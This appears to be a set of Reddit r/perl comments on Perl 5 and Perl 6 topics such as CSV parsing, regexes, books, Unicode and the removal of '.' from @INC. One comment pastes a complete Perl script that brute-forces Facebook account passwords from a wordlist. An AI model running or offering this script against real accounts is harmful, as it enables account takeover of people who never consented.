Thank you it did. For anyone else stuck, it turns out that Outlook require the following event attributes to parse ics files: UID and DTSTAMP. Also, for the Outlook Webapp it doesn't show up in the Inbox unless you set METHOD:REQUEST in the calendar attributes.
Each instance of "UTF-8" in this article should be replaced with "Unicode", as this has nothing to do with character encoding. (except for the "use utf8;" which is necessary because your source code is encoded)
Awesome
`$instructordetails[0]` is indexing into `@instructordetails` to get the first element, which is an arrayref. It is not doing anything with `$instructordetails`, which is a completely separate variable that isn't being used at all in the example. To dereference that arrayref you need to write `$instructordetails-&gt;[0]`. 
Are you looking for the word boundary special character (\b)? $foo =~ /\bhello_world\b/; will match "Hi hello_world how are you?" and match "hello_world"
I see you've made the effort to actually look around a little. You seem to want a solid book. Sadly Programming Perl is [not great](http://perl-tutorial.org/rejected/prog_perl_4th/). Modern Perl is essential reading, but it mainly serves to keep you from stumbling into traps laid by the decades old history of perl. Effective Perl seems to be more a "bag of tricks" book. For a comprehensive "learn Perl with this" work, you want Ovid's Beginning Perl.
When parsing CSV files, [Text::CSV](https://metacpan.org/pod/Text::CSV) is your friend. use strict; use warnings; my $csv = Text::CSV-&gt;new({binary=&gt;1}) or die Text::CSV-&gt;error_diag(); open my $handle, '&lt;', $instructors or die "$!\n"; while(my $row = $csv-&gt;getline($handle)) { for my $field (@$row) { print "$field\n"; } } 
Unfortunately, this matches 'hello world how are you', which the OP wants to reject.
 for 'instructors.txt'.IO.lines.map: *.split: /\,/ { .[0..3].map: *.say } # one liner (P6) (fixed as explained in comment below)
You're creating an array of arrays. They way perl implements these is by references. Each array is a one dimensional list of array-references - to anonymous arrays once `my @fields` drifts out of scope. So that's why you see `ARRAY(0xc0ffee)` when printing - because that's what the 'value' of the (scalar) array reference actually is. But you're also confusing yourself by having `$instructordetails` and `@instructordetails`. That foreach loop - you don't actually use the iterator, because `$instructordetails[0]` relates to `@instructordetails` _not_ `$instructordetails`. Try: foreach my $instructor ( @instructordetails ) { print join ( ":", @$instructor ),"\n"; }
There's more than one Perl 😃 For Perl 6 resources see the [Resources page](https://perl6.org/resources/); in particular the `For Newcomers` panel and the `Books` panel. 
Take a look at things like `Data::Printer` or `Data::Dumper`. They can help you visualise the data and work out what's wrong in cases like this
Provided one narrows one's focus to the OP's topic (finding a font able to render a string), and noting that he wrote this article in 2003, it's a great pick. But, in case folk think Joel's article still works as a general intro in 2017, well, it really doesn't. Joel chose a low rung on [wittgenstein's ladder](https://en.wikipedia.org/wiki/Wittgenstein%27s_ladder) and pretended that a "codepoint" was the Unicode equivalent of a "letter" or "character". He simply ignored "what a user perceives as a character" (as Unicode refers to them). Ignoring what humans think of as characters in 2017 is, imo, as heinous a crime as magical thinking in relation to encodings was in 2003.
Def Ovid's Beginning Perl, Learning Perl is a pretty good second, and Modern Perl is a good read. Programming Perl is more interesting from a philosophical perspective. Higher Order Perl is for those of us that are interested in things like functional programming and recursion. Also there is Lee's Beginning Perl which is also good and free on the Perl.org site.
WWW::WebKit or Gtk3::WebKit should be able to help you. You cab find some random examples for Gtk3::WebKit in here https://github.com/potyl/Webkit.
Yes, graphemes are a whole other matter (and not handled natively by perl 5 unless you pass things through Unicode modules; it also generally assumes "character" == "codepoint"). But I still think the article is a good starting point for understanding, particularly about encoding, where lots of people currently have none.
Really it's a question of where does the script expect the file to be, and where is it really?
I loved Ovid's book. [Perl Best Practices](http://shop.oreilly.com/product/9780596001735.do) is also a very precious tool, even if it is a bit old and that the *modern way* books integrated it. 
#!/usr/bin/perl # use strict; use Net::SSLeay::Handle; if(!defined($ARGV[0] &amp;&amp; $ARGV[1])) { system('clear'); print "\n"; print " ____ ___ ____ ___ _ _ _ _ _ _ \n"; print " / ___|( _ )| __|| |( ) / ) / ) / ) | ) | |\n"; print " (___ || ||| |_ | | ( V ) / _ ) / _ ) | )| |\n"; print " ___)|||_||| _| | | | | / ___ ) / ___ ) | |( |\n"; print " |____)(___)|_| |___| |_|/_/ (_)(_/ )_)|_| (_|\n"; print "\033[1;32m ======================================================\n"; print "\033[1;32m Usage: perl $0 Email wordlist.txt\n"; print "\033[1;32m ======================================================\n"; exit; } my $user = $ARGV[0]; my $wordlist = $ARGV[1]; open (LIST, $wordlist) || die "\n[-] Can't find/open $wordlist\n"; print "\n"; print " ____ ___ ____ ___ _ _ _ _ _ _ \n"; print " / ___|( _ )| __|| |( ) / ) / ) / ) | ) | |\n"; print " (___ || ||| |_ | | ( V ) / _ ) / _ ) | )| |\n"; print " ___)|||_||| _| | | | | / ___ ) / ___ ) | |( |\n"; print " |____)(___)|_| |___| |_|/_/ (_)(_/ )_)|_| (_|\n"; print "\033[1;32m ========================================================\n"; print "\033[1;32m Subscribe to My Channel: \n"; print "\033[1;32m https://www.youtube.com/channel/UCQlUztxzu-hzYtlgsF3wMew \n"; print "\033[1;32m For More Lastest Updates \n"; print "\033[1;32m ========================================================\n"; print "\033[1;32m\n [+] Brute Force Attacking on: $user ...\n\n"; print "=======================================\n"; while (my $password = &lt;LIST&gt;) { chomp ($password); $password =~ s/([^^A-Za-z0-9\-_.!~*'()])/ sprintf "%%%0x", ord $1 /eg; my $a = "POST /login.php HTTP/1.1"; my $b = "Host: www.facebook.com"; my $c = "Connection: close"; my $e = "Cache-Control: max-age=0"; my $f = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"; my $g = "Origin: https://www.facebook.com"; my $h = "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31"; my $i = "Content-Type: application/x-www-form-urlencoded"; my $j = "Accept-Encoding: gzip,deflate,sdch"; my $k = "Accept-Language: en-US,en;q=0.8"; my $l = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3"; my $cookie = "cookie: datr=80ZzUfKqDOjwL8pauwqMjHTa"; my $post = "lsd=AVpD2t1f&amp;display=&amp;enable_profile_selector=&amp;legacy_return=1&amp;next=&amp;profile_selector_ids=&amp;trynum=1&amp;timezone=300&amp;lgnrnd=031110_Euoh&amp;lgnjs=1366193470&amp;email=$user&amp;pass=$password&amp;default_persistent=0&amp;login=Log+In"; my $cl = length($post); my $d = "Content-Length: $cl"; my ($host, $port) = ("www.facebook.com", 443); tie(*SSL, "Net::SSLeay::Handle", $host, $port); print SSL "$a\n"; print SSL "$b\n"; print SSL "$c\n"; print SSL "$d\n"; print SSL "$e\n"; print SSL "$f\n"; print SSL "$g\n"; print SSL "$h\n"; print SSL "$i\n"; print SSL "$j\n"; print SSL "$k\n"; print SSL "$l\n"; print SSL "$cookie\n\n"; print SSL "$post\n"; my $success; while(my $result = &lt;SSL&gt;){ if($result =~ /Location(.*?)/){ $success = $1; } } if (!defined $success) { print "\033[1;31m[-] $password -&gt;its not match \n"; close SSL; } else { print "\033[1;32m\n########################################################\n"; print "[+] \033[1;32mPasswd match found: $password\n"; print "\033[1;32m########################################################\n\n"; close SSL; exit; } } 
https://pastebin.com/zZ8EBJa8
For no good reason... @ARGV = 'instructors.txt'; while (&lt;&lt;&gt;&gt;) { chomp; say +(split /,/)[0..3] } But what I'd actually do (because this also handles UTF-8 content and doesn't use random magical stuff): use File::Slurper 'read_lines'; for my $line (read_lines 'instructors.txt') { say +(split /,/, $line)[0..3]; } Or more likely, just use Text::CSV::csv().
Better to pay attention to your screen next time. Usage: perl script-name.pl (facebook-email) (wordlist-file) anyway.. I think you got into wrong sub, as it's not related to perl programming, you are just using script that you downloaded from internet, without basic knowledge how it works. What are you expecting from the script to do? the script is very primitive, it wants email as first parameter and password list file as a second parameter. I would not bother using it, as facebook has very tight limit of password tries before it locks your IP from the system.
You handled that well.
I realized it after texting. I am on mobile now, i am going to paste it into an editor when i have access to a pc again. 
Yes (to all your points in this thread).
The + is to prevent `say (split /,/, $line)[0..3];` from being parsed as `say(split /,/, $line)` and then barfing with a syntax error when it sees the `[`. Parentheses are fun in the parser, almost as much as braces.
https://geekuni.com/certification
Ok I know nothing about this linguistic thing but I succesfully created a package using the s17.sch file in the examples folder. I get a pm file with a lot of functions that are mostly gibberish to me and it is not clear to me what the code should be doing. But it seems to be about the functions defined here: @EXPORT_OK=qw( debug_step option_eyR_falling option_fricativize_f option_fricativize_m option_hiatus_epenthesis option_latin_syncope option_medial_short option_short_i_umlaut option_shorten_final_i option_syncope_shortening set_debug set_option_eyR_falling set_option_fricativize_f set_option_fricativize_m set_option_hiatus_epenthesis set_option_latin_syncope set_option_medial_short set_option_short_i_umlaut set_option_shorten_final_i set_option_syncope_shortening split_syl step_EIS_ISorth step_EIS_MIS step_Latin_PG step_Latin_Vulgar step_ON_EIS step_PG_PN step_PN_ON step_normalise_EIS step_normalise_Latin step_normalise_PN ); Those are the functions that can be exposed to the "outside world" so what you can do is create a file bla.pl with: use HT::Conlang::S17 qw(split_syl set_debug ) ; # and/or other functions you may need split_syl('foo'); # or whatever, no clue what this does! I hope the functions make some sense to you, maybe you'll know what to do with it. :) 
Thanks!
It's not quite clear from your post what exactly you're trying to do, so it's hard to provide specific help. Are you simply wanting wanting to match the string "hello_world" but not the string "hello_world_howAreYou"? Then use the test: $your_string eq 'hello_world' as others recommended. Are you wanting to replace the 'hello_world' substring to something else within a larger string? This will replace the *first* 'hello_world' found in the larger string: $full_string = 'hello_world_howAreYou'; $full_string =~ s/hello_world/something_else/; If you want to match *every* instance of 'hello_world' in the larger string, add the 'global' modifier: $full_string =~ s/hello_world/something_else/g; Search for "perldoc perlre" from the command line or in your browser to learn more about perl regular expression syntax, flags and modifiers.
how do I make such a file run? Would it be something like opening the cmd or terminal and typing perl bla.pl 
Here's the deal: You write a perl program including that module then it appears you call @EXPORT_OK=qw( debug_step option_eyR_falling option_fricativize_f option_fricativize_m option_hiatus_epenthesis option_latin_syncope option_medial_short option_short_i_umlaut option_shorten_final_i option_syncope_shortening set_debug set_option_eyR_falling set_option_fricativize_f set_option_fricativize_m set_option_hiatus_epenthesis set_option_latin_syncope set_option_medial_short set_option_short_i_umlaut set_option_shorten_final_i set_option_syncope_shortening split_syl step_EIS_ISorth step_EIS_MIS step_Latin_PG step_Latin_Vulgar step_ON_EIS step_PG_PN step_PN_ON step_normalise_EIS step_normalise_Latin step_normalise_PN ); one of those subroutines to do stuff. It *appears* that split_syl is called by subs like step_normalise_Latin so your code would call that I guess. 
Agreed. I whined a lot on here a/b the lack of Perl6 books and now we have like 6 of them with more in the making. Quite exciting times. I'm still waiting a little while longer for things to mature more, but it is getting close. I'm pretty sure with the REPL and basics of the language I can already do most of what I do in Python, but cleaner. However, I'm hoping it won't be too hard to pick up the advanced parts. All the progress is impressive, but I'm still waiting on better performance.
I'm not a web developer and have zero knowledge in that area, but I'd like to learn someday if there is a way to do it in Perl6 and mostly avoid JS. Will the book be accessible to those with little web domain knowledge?
&gt; Actually, in perl6, those two say examples will work identically. What version are you running / how are you running it? say $*PERL.compiler; # rakudo (2017.01) say(1,2,3,4); # 1234 say (1,2,3,4); # (1 2 3 4) &gt; if you pass a single array or list to a function, that single item gets flattened automatically That depends on the function's signature. In this case, the [matching signature](https://github.com/rakudo/rakudo/blob/a47a78f8591d6118600a93e93246a885be674d09/src/core/io_operators.pm#L30) is `(**@args is raw)`. As the [slurpy args doc](https://docs.perl6.org/type/Signature#Types_of_Slurpy_Array_Parameters) says, "The double asterisk form does *not* flatten arguments." (*emphasis* added by me).
Take a look at [WWW::Mechanize's click\(\) methods.](https://metacpan.org/pod/WWW::Mechanize#$mech-%3Eclick\(-$button-%5B,-$x,-$y%5D-\))
The most significant change in this release that everyone should be aware of: https://metacpan.org/pod/release/XSAWYERX/perl-5.26.0/pod/perldelta.pod#Removal-of-the-current-directory-(%22.%22)-from-@INC The [original ticket](https://rt.perl.org/Public/Bug/Display.html?id=127834) that eventually led to this change has been made public finally.
perl++
I highly doubt that is true, or significantly less CPAN modules would be broken by this change.
Module developers usually get Perl from upstream, I think. They must have to, actually, to test their modules with development Perl and older versions. They are a very important demographic, but a small one nonetheless. This was such a big hole that distros couldn't afford to wait for p5p to release a new version with a fix.
Yes, Debian has had this patched for a while due to the ticket I linked above. What I meant was that "everyone" was certainly not already patching this.
You mean other distros weren't patching it?
This is going to break _everything_. All this is telling me is that I can never upgrade to Perl 5.26. Which is fine; most of my scripts are set to use 5.14 so that they have access to `say` and 'use strict' is enabled by default.
That's a little overdramatic (but not entirely incorrect, it is significant). Most of CPAN has already been either fixed or temporarily kludged for install/test. If you are relying on this behavior, your code is likely vulnerable and you should consider other options. For example, I tend to rely on [`__FILE__`](https://metacpan.org/pod/perldata#Special-Literals) for finding module paths relative to the current file's location, avoiding the use of the current working directory entirely.
[In 5.22](https://metacpan.org/pod/distribution/perl/pod/perl5220delta.pod#find2perl,-s2p-and-a2p-removal) it was moved from core to CPAN. Install [`App::find2perl`](https://metacpan.org/pod/App::find2perl) to restore the functionality. That applies to the sed and awk translation scripts too. [You can read the discussion here](https://groups.google.com/forum/#!topic/perl.perl5.porters/3RBKnlPaSmA). `find2perl` seems to have been a casualty of the other translators, which were seen as unnecessary ancient clutter. I think there's been a movement in recent years to prune away a lot of the truly ancient cruft that has traditionally shipped with core, like those old v4-style modules (I'm blanking on their names or how they were used, but they were ancient.) 
Thank you a lot for the explanation and references!
You may like FindBin (in core)
I specifically avoid FindBin because it relies on the script that "started" the process, which gets confusing and unreliable when you're using things like web application servers, and isn't really useful for modules that could be called from scripts elsewhere. `__FILE__` always refers to the filename of the file it appears in.
Don't do this. Read the name of the variable you just recommended to set. (Also, it's planned to be removed in a couple releases)
That's at compile time, I suppose?
It's an environment variable. You set it in your shell when executing perl or whatever perl script. The perldelta entry linked above goes into that (and why you shouldn't blindly use it).
This isn't a trap... more like misinformation... And I notice our [own docs misuse .WHAT a bunch](https://github.com/perl6/doc/issues/1355)
"everyone". Debian and Ubuntu *had* to because the impetus was that this was a vulnerability path in their package manager. I don't know about other vendors, but if you didn't have Perl in a very-critical path in your OS, the consequences of patching this give marginal benefits ( to the point of potentially being imagined benefits on some systems ) at the price of substantial breakage. As it is, I've pretty much done nothing other than cleanup this breakage for the last 3 months as part of prepping to ship 5.26, let alone having shipped an equivalent fix in an earlier Perl. And I'm *still* a long way from *that* finish line.
Thanks. I've updated the article, but 1) I think WHAT is easier to type and clearer. 2) I don't understand why is there a WHAT if it is not really good?
The impetus came from cPanel, not from apt.
The impetus for the change in Perl came from a contributor to cPanel. But the impetus for Debian to patch their Perl 5.22 was not related to cPanel. The cited security bug literally gives a demonstration of an attack vector that is triggered when a user executes `sudo apt-get update` 
It's really good, but for the purpose it was designed for: [to obtain invocant's type object](https://github.com/rakudo/rakudo/blob/79b8ab9d3f9a5499e8a7859f34b4499fb352ac13/src/core/Promise.pm#L152). Yes, it might be easier to type and you can perfectly use it to find out the name of the thing, *if you're aware of all of its caveats* and know to switch to `.^name` when you do want the full name or to whatever-close over it. But users reading the article won't know of these caveats if they never heard of `.WHAT` before.
Well, most distros include cPanel and it is affected by the security bug in Perl.. I think it's bad security practice to leave Perl without a patch because it's too hard to fix the problem.
Symbolic references took this even further, you could write `$$foo` when $foo is a string and get the variable with that name. `strict 'refs'` disallows this in modern Perl because that's a little too easy to mess up, and a little confusing when applied to lexical variables.
Don't pay too much attention to the name, its misleading at best. INC is not "safe" by turning that flag off, and it is not "unsafe" by turning that flag on. Telling people "don't do this because insecure" when we do this in CPAN.pm and TAP::Harness will lead to, and has already lead to, predictable confusion. Path strings are not inherently secure or insecure. The physical objects on disk that they represent are, depending on their whole history of who had access to them. The only fault of "." (as of all relative paths) is that it may at different times refer to different things, but you’d have to examine each of the things individually to ascertain its security. Its however an incredibly unfortunate reality that the majority of places affected by this change were not insecure to begin with, and setting this environment variable gives a suitable way out.
I don't even see anything meeting a description of 'cPanel' shipping in debians package database.
I see now that they don't support Debian, you're completely right.
CPAN.pm and TAP::Harness are not used during runtime. Enabling this during production runtime is an astronomically different situation than enabling it for building and testing modules. And yes, any relative path in @INC is just as insecure; this is just one way to get one, which happens to be well known and have been set by default.
CPAN.pm and TAP::Harness are the exact opposite of “astronomically different”: nothing in the least special. It’s all just running Perl code. If you chdir into an insecure directory then having `.` in `@INC` is insecure, and if you don’t it’s not. That’s why it’s not insecure for CPAN.pm and TAP::Harness to set the variable and that’s no different in production.
I did not say those modules were different. I said having a relative path in @INC during runtime is different. Which it is.
You gave no reason why. I’m saying none exists, and I explained why not.
&gt; Your explanation is a non sequitor. Why is it not insecure to set the variable at runtime? What about “If you chdir into an insecure directory then having `.` in `@INC` is insecure, and if you don’t it’s not” is a non sequitur? What about it is incorrect at runtime vs… whatever else time? &gt; Why did we bother with any of this then? (Now you are just tempting me to say “That would be the question then, wouldn’t it?”…) Because it’s the only relative path in the (pre-5.26) default `@INC`, and as such can refer to different things at different times, which in some minority of cases (such as Debian’s) are insecure. So making it a default was a bad choice, way back in perl 3, because it forces every user to audit every possible cwd from within which their code loads optional modules. This is almost never a problem – but only almost. That “almost” is what got fixed by revoking the default. OTOH, well, it is almost never a problem. (So I think the change was necessary in the long term, but this timeline was *way* too short.)
That's the thing about security issues, isn't it? They aren't a problem, until they are.
Edited a week later. Thank you /u/pre_action. Thank you p5p. I've deleted my comments as I now think they're likely to confuse many readers and unlikely to help any. Sorry for the noise.
Especially true for documentation, every little bit helps.
The article concludes with this statement: &gt; In my ideal, fantasy Perl, everything would be object oriented. It would be a simpler Perl, with much less syntax than the Perls of today. I think it would have sigils, but only $. All variables would begin with dollar Fantasy becomes reality! If you want to only use `$` in Perl 6 variables, you can. The only concession you need to make is that a scalar is a single item, so if you wish to iterate over a list then you need to contextualize your scalar appropriately my $scalar = 1; my $array = [ 1, 2, 3 ]; my $hash = { one =&gt; 1, two =&gt; 2, three =&gt; 3 }; for $scalar -&gt; $x { say $x } for $array.list -&gt; $i { say $i } for $hash.pairs -&gt; $p { say "$p.key(): $p.value()" } for $hash.keys -&gt; $k { say "$k: $hash{$k}" } for $hash.kv -&gt; $k, $v { say "$k: $v" } 
Nice. :) I think it's illuminating to go further and eliminate sigils entirely (by "slashing" them out): my \scalar = 1; my \array = [ 1, 2, 3 ]; my \hash = { one =&gt; 1, two =&gt; 2, three =&gt; 3 }; for scalar -&gt; \x { say x } for array.list -&gt; \i { say i } for hash.pairs -&gt; \p { say "{p.key}: {p.value}" } for hash.keys -&gt; \k { say "{k}: {hash{k}}" } for hash.kv -&gt; \k, \v { say "{k}: {v}"} Slashing the sigil in a variable declaration and assigning an immutable value directly to it leaves that variable immutable. If you add the line of code: `scalar = 42;` you'll get a "Cannot modify an immutable Int" message. If you want mutable no-sigil variables, initialize them with a Scalar container: my \scalar = $ = 1; my \array = $ = [ 1, 2, 3 ]; my \hash = $ = { one =&gt; 1, two =&gt; 2, three =&gt; 3 }; for scalar -&gt; \x { say x } for array.list -&gt; \i { say i } for hash.pairs -&gt; \p { say "{p.key}: {p.value}" } for hash.keys -&gt; \k { say "{k}: {hash{k}}" } for hash.kv -&gt; \k, \v { say "{k}: {v}"} scalar = 42; array[1] = 42; hash&lt;four&gt; = 42;
It would be great to get this project finished at last.
I think it should just be a static site. That is the trend where the blogging, especially tech blogging, is moving. IMO having a GUI for something like that is an overkill.
If you like it, App::find2perl is available for adoption ;-)
[OH](https://irclog.perlgeek.de/perl6/2017-06-06#i_14692498): daxim: &gt; 1. comments need to be hierarchical and addressable, this way we can import the "use.perl.org" articles and comment archive without loss of fidelity. &gt; 2. user management needs to support merging identities, because on b.p.o article authors and commenters are already different identities and this is a favourable moment to clean up some mess. andrewalker: &gt; yes, I agree. It's really weird that b.p.o. authors and commenters are different identities, this should definitely be fixed. And 1. also makes sense, shouldn't be a problem.
no perl 6 at all?
DDG launched in 2008, and to my knowledge, there was no distribution of Perl 6 at the time that was targeting production-ready stability. The language spec may even have changed substantially since then (I'm thinking GLR etc) So that said, I'd be very surprised to find much Perl 6 involved Edit: Info on their Perl setup [here](https://github.com/duckduckgo/duckduckgo/wiki/DuckDuckGoPerl)
Highly doubt it. Perl 6 first came out Christmas 2015.
The referenced bug report and article are from 3 and a half years ago, so something else must have changed recently to break these images.
It broke my terminal. I had to remove everything installed from cpan and reinstall.
That sounds like you upgraded perl in place. All XS modules incl dual-life core modules will be incompatible with the new version. Don't do that unless both the perl and all installed modules are managed by a package manager that can upgrade them both together. This is unrelated to the topic of this comment thread though.
From `perldoc perlrun`: &gt; Perl can be built so that it by default will try to execute `$Config{sitelib}/sitecustomize.pl` at startup (in a BEGIN block). This is a hook that allows the sysadmin to customize how Perl behaves. It can for instance be used to add entries to the @INC array to make Perl find modules in non-standard locations.
Sure, use the -I option to point where the modules are located in the USB stick. From the perlrun man page: -Idirectory Directories specified by -I are prepended to the search path for modules (@INC). 
You're probably just fine installing them to the SD card. Copying files around during the module install isn't going to hurt it *that* much. Speed-wise, they'll probably come out the same, which is terrible.
To add, cpanm has a simple -l (lowercase L) option to install modules into a local::lib, or -L will additionally include dependencies that are already installed elsewhere inside the local::lib. For example if you install a module with `cpanm -L /path/to/stick/local` then you can load the modules with `perl -I/path/to/stick/local/lib/perl5 script.pl`. Just keep in mind these modules won't work across different perl versions generally.
Can you name one?
CPanel, Booking, DuckDuckGo, the usual suspects.
Oh, when you said "paying for Perl 6 development", I thought you meant "Have paid developers on their team actively pursuing Perl6". Supporting Perl6 development through TPF Funding is ... quite a bit different from what I thought you'd said. Though with regards to names, the only public record I see is this: http://www.perlfoundation.org/sponsors 
I bet they use the MetaCPAN v0 API which was turned off at the start of June. Someone needs to update their code to use v1 instead.
Yeah, those. [Jesus, my eyes](https://metacpan.org/source/ZEFRAM/Perl4-CoreLibs-0.003/lib/abbrev.pl). Using typeglobs to pass a hash because there were no references, using `'` as the package delimiter and just brazenly inserting names into `main` because there was no `Exporter`, localizing everything because there were no lexicals (but apparently not even doing a very good job of that and leaking globals all over the place.) Life sure sucked in Perl4. &lt;shudder&gt; 
Is this homework?
It really reads like homework.
The "kwalitee" hasn't, unfortunately. https://github.com/choroba/syntactic-construct
For anyone that wants to try a nice language that has the concept of graphemes natively (i.e. does the right thing), there's Perl6: $ perl6 -e 'for &lt;p̂ ế â ﬁ ẛ ự-phản-đối-việc-tách-nhà-thờ-ra-khỏi-nhà-nước&gt; &gt; { my $codes = minmax (.NFC.elems, .NFKC.elems, .NFD.elems, .NFKD.elems); say "{.Str}: {.chars} chars | between " ~ &gt; " $codes.min() and $codes.max() codepoints | {.encode("UTF-8").bytes} bytes | flip: {.flip} | comb: {.comb.join("·")}" }' p̂: 1 chars | between 2 and 2 codepoints | 3 bytes | flip: p̂ | comb: p̂ ế: 1 chars | between 1 and 3 codepoints | 3 bytes | flip: ế | comb: ế â: 1 chars | between 1 and 2 codepoints | 2 bytes | flip: â | comb: â ﬁ: 1 chars | between 1 and 2 codepoints | 3 bytes | flip: ﬁ | comb: ﬁ ẛ: 1 chars | between 1 and 2 codepoints | 3 bytes | flip: ẛ | comb: ẛ ự-phản-đối-việc-tách-nhà-thờ-ra-khỏi-nhà-nước: 45 chars | between 45 and 61 codepoints | 64 bytes | flip: cớưn-àhn-iỏhk-ar-ờht-àhn-hcát-cệiv-iốđ-nảhp-ự | comb: ự·-·p·h·ả·n·-·đ·ố·i·-·v·i·ệ·c·-·t·á·c·h·-·n·h·à·-·t·h·ờ·-·r·a·-·k·h·ỏ·i·-·n·h·à·-·n·ư·ớ·c 
No, but if I can get direction on how to attack problem, I would appreciate it.
Ovid, You mind going over what constitutes as "Declarative" in your book? I tend to think more along the lines of functional programming, but it seems like you've twisted (not in a bad way) OO behind the scenes and somehow still are able to up the level onto a higher plane. I don't think I've run into much OO code like this. Also, will the talk be on YouTube?
True. In that case, I would point the OP at the sidebar which contains links for those purposes.
OP hasn't shown any code or said a thing about what his issues are, just copy and pasted a problem without even asking a question. Personally, I'm much more willing to help if they've made some sort of effort.
In the sense that I can simply "declare" what something is in the way that Prolog allow. In fact, `Steps()` are quite often order-independent, just as Prolog and SQL usually are (or are supposed to be). However, these things are quite frequently time-sequenced because we are modeling behavior here, and in the real-world, time is an element one can't ignore.
Oh, and I've no idea if the talk will be on Youtube, though I suspect it will be.
Moose is another example of a system that uses a declarative API but leverages an object model beneath the covers to implement everything.
I've always allowed my talks to be recorded. The Perl community has given me a lot, so I try to give back.
Ehehehe. It's pointless to state these kinds of problems without also specifying a CPU-time/memory limit :) since if you're allowed to wait for the heat death of the universe, any old chunk of code will do :) A naive solution like finding all combinations... "aeiaaioooaauuaeiou".comb .combinations.grep(*.squish eq "a e i o u") .map(+*).max.say # OUTPUT 10 ... or using a regex ... ("aeiaaioooaauuaeiou" ~~ m:ex/ [(a) .*?]+ [(e) .*?]+ [(i) .*?]+ [(o) .*?]+ [(u) .*?]+ /).map(*.list.flat.join.chars).sort(-*.chars).say; # OUTPUT 10 ...will work for short strings, but as you go up to the specified `5 × 10⁵` char upper limit, you'll quickly find yourself having to wait for very long periods of time. That's kinda the point of these problems. You need to figure out a better algo, and with this type of challenges, there's usually One Weird Trick™ you can use to bring the performance to reasonable levels. Just thinking off the top of my head, I'd probably try to break up the string into positions for all the letters: my %pos.push: "aeiaaioooaauuaeiou".comb.antipairs; dd %pos; # OUTPUT: Hash %pos = { # :a($[0, 3, 4, 9, 10, 13]), # :e($[1, 14]), # :i($[2, 5, 15]), # :o($[6, 7, 8, 16]), # :u($[11, 12, 17])} Then, we can filter `.tail` and the `.head` of each of the letter's range that's outside the adjacent letter's range since that definitely can't be part of the magic string: my %pos.push: "eeeeaeioueeee".comb.antipairs; dd %pos; $_ .= Array for %pos.values; for %pos&lt;a e i o u&gt;.rotor: 2 =&gt; -1 -&gt; ($a, $b) { $a.pop while $a and $b and $a.tail &gt; $b.tail; $b.shift while $a and $b and $b.head &lt; $a.head; } dd %pos; # OUTPUT: # Hash %pos = {:a(4), :e($[0, 1, 2, 3, 5, 9, 10, 11, 12]), :i(6), :o(7), :u(8)} # Hash %pos = {:a($[4]), :e($[5]), :i($[6]), :o($[7]), :u($[8])} And from then, I'd try doing kinda like a "stitch" through each letter's position. You go in and out in each letter just once. First try the maximum range and see if that's a magic string. Then try combinations of one-fewer ranges of indices for each letter, and doing sort of sliding window thing. The minute you hit a magic string, you found the maximum length. Whether that'll perform any better than a boiled potato, I've no idea. The worst case scenario is string `'aeiou' x 1e5`, so if you can get right answers and make your code perform reasonably well with that string, you got the solution. Best of luck! 
Is this perl6? I haven't seen perl6 code before, hence I'm having trouble reading it. Is perl6 mainstream nowadays?
&gt; Is this perl6? Yeah, it's Perl 6 :) &gt; I haven't seen perl6 code before, hence I'm having trouble reading it [Learn X in Y minutes](https://learnxinyminutes.com/docs/perl6/) should get you up to speed in... Y minutes. There's also [perl6intro.com](http://perl6intro.com/) and [other resources](https://perl6.org/resources/) including some books, one of which you [can download for free or purchase a print version of](http://greenteapress.com/wp/think-perl-6/) &gt; Is perl6 mainstream nowadays? Not sure what that means. The first stable release happened in December, 2015 and people use it, so it's somesortofstream. Does that answer your question? :)
Thanks, you're right, behaviour for multiple-iterables was undefined. However, [we discussed it](https://irclog.perlgeek.de/perl6-dev/2017-06-16#i_14743982) and deemed current behaviour correct, and I'll write the specs and the docs tomorrow to cover it. The current signatures you see in source are that way for perf reasons. The user-facing signature is `+values`. The difference between .push and .append is append takes that `values` Iterable and appends **its contents** to the Array, while .push just pushes its arguments as is. And yes, with multiple Iterable args, the apparent behaviour is .push and .append are the same. The problem with the `*@values` signature you propose is that it's flattens non-containerized Iterables. So, for example dd [].append: (1, %(:42a, :70b), 2, (3,)) Would end up with a flat Array `[1, :42a, :70b, 2, 3]`, completely destroying inner List and the Hash. And basically that's what the discussion was about and we decided it's more useful to maintain the simpler and less surprising, non-destructive/flattening behaviour, even if the multi-arg case ends up same as .push &gt; You can get the same result without monkeying around like this You can also just slip them in: @z.append: |@x, |@y; 
Got a link? I've never heard of it. 
I do. [http://wiki.slimdevices.com/index.php/Main_Page](http://wiki.slimdevices.com/index.php/Main_Page)
Kwalitee fixed as well: https://github.com/cpants/www-cpants/issues/96
Using Perl since 2001. Now started learning Go in spare-time. It's interesting!
This is a good point. The while-each construct only works with a hash that has already been constructed, not on one constructed inside the while condition, because unlike a foreach loop it executes the condition every iteration. Also don't use the variables $a and $b. By declaring them lexically you break any sort that might happen to occur in that scope. See https://metacpan.org/pod/Perl::Critic::Policy::Freenode::DollarAB (and relevant to this blog post, https://metacpan.org/pod/Perl::Critic::Policy::Freenode::Each)
I just don't see how this is a problem specific to each. It's really a problem with not understanding how while works. In our shop best coding practice would prohibit this code anyway: * instantiating an anonymous variable inline. It should almost always be instantiated outside of the loop, the way the uncommented version does, for identification and ease of debugging (you can dump the value to stderr before executing the loop). * using single-letter variables like $a, $b, and $c. Exceptions for $i and $j for loop control. Extra demerits for using $a and $b, because it interferes with sort (like /u/Grinnz pointed out).
Hi 0racl1e, The *Relationship to the Either monad* section of the Railway Oriented Programming article begins: &gt; Any Haskellers reading this will immediately recognize this approach as the Either type, specialized to use a list of a custom error type for the Left case The article's content, and the above comment in particular, strongly suggest that this is a recipe that basically duplicates what Perl 6 already has built in. Have you explored Perl 6 types from the perspective that ["all (Perl 6) types are also their own option type"](https://en.wikipedia.org/wiki/Option_type#Perl_6)?
